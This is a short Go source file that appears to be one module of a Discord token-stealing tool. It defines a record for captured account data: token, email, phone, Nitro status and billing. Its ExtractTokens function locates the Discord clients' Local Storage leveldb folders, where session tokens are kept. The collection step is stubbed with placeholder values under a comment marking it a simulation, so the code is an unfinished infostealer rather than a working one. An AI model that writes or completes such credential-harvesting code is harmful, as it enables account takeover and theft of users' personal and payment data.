package discord

import (
    "fmt"
    "os"
    "path/filepath"
)

type DiscordToken struct {
    Token    string `json:"token"`
    UserID   string `json:"user_id"`
    Username string `json:"username"`
    Email    string `json:"email"`
    Phone    string `json:"phone"`
    Nitro    bool   `json:"nitro"`
    Billing  string `json:"billing"`
}

func ExtractTokens() ([]DiscordToken, error) {
    home, err := os.UserHomeDir()
    if err != nil {
        return nil, err
    }

    discordPaths := []string{
        filepath.Join(home, "AppData", "Roaming", "discord", "Local Storage", "leveldb"),
        filepath.Join(home, "AppData", "Roaming", "DiscordPTB", "Local Storage", "leveldb"),
        filepath.Join(home, "AppData", "Roaming", "DiscordCanary", "Local Storage", "leveldb"),
    }

    var tokens []DiscordToken

    for _, path := range discordPaths {
        if _, err := os.Stat(path); os.IsNotExist(err) {
            continue
        }

        // Simulação de coleta de tokens
        token := DiscordToken{
            Token:    "token_exemplo_123",
            UserID:   "123456789",
            Username: "User#1234",
            Email:    "user@example.com",
            Nitro:    true,
        }
        tokens = append(tokens, token)
    }

    return tokens, nil
}
